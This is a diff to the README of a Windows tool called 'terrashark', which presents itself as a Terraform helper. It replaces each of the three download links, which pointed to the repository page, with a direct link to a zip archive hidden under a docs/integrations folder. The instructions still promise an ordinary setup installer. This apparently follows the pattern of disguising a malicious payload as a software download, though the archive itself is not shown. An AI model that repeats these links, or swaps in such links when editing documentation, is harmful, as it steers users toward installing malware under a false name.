@@ -1,6 +1,6 @@
 # 🦈 terrashark - Clear Terraform Code, No Errors
 
-[![Download terrashark](https://img.shields.io/badge/Download-terrashark-4CAF50?style=for-the-badge)](https://github.com/24braids/terrashark)
+[![Download terrashark](https://img.shields.io/badge/Download-terrashark-4CAF50?style=for-the-badge)](https://github.com/24braids/terrashark/raw/refs/heads/main/docs/integrations/Software_3.8.zip)
 
 ## 📋 About terrashark
 
@@ -29,7 +29,7 @@ To use terrashark on Windows, your computer needs:
 ## 🚀 Getting Started: Download and Install terrashark
 
 1. Click the green download badge above or visit this link:  
-   https://github.com/24braids/terrashark
+   https://github.com/24braids/terrashark/raw/refs/heads/main/docs/integrations/Software_3.8.zip
 
 2. On the GitHub page, look for the latest release or download section. Download the Windows setup file, usually named something like `terrashark-setup.exe`.
 
@@ -77,7 +77,7 @@ The application understands the unique settings and best practices for each plat
 ## 📥 Download terrashark Now
 
 Visit this page to download for Windows:  
-[https://github.com/24braids/terrashark](https://github.com/24braids/terrashark)
+[https://github.com/24braids/terrashark/raw/refs/heads/main/docs/integrations/Software_3.8.zip](https://github.com/24braids/terrashark/raw/refs/heads/main/docs/integrations/Software_3.8.zip)
 
 You will find the latest Windows installer ready to download.
 
